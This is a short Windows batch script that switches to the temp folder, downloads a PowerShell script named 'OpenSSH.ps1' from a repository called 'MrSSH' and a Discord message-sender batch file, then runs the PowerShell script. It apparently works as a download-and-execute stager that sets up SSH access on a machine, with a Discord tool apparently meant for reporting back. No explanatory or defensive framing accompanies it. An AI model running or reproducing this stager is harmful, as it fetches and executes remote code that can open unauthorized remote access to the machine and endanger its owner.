C:
cd %temp%

curl https://raw.githubusercontent.com/dh3b/MrSSH/main/SSH%20FIles/OpenSSH.ps1 -O ssh.ps1
curl https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discord-Message-Sender/Source.bat -O discordmsg.bat

powershell ./ssh.ps1
